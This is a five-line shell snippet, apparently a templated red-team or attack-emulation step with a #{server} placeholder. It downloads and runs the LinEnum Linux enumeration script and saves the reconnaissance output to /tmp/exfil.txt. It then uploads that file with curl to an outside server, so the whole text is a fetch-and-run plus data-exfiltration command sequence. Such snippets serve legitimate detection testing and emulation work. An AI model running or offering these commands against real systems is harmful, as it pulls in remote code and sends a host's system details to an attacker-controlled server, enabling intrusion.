wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;
chmod +x LinEnum.sh;
./LinEnum.sh > /tmp/exfil.txt;
curl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;
cat /tmp/exfil.txt;
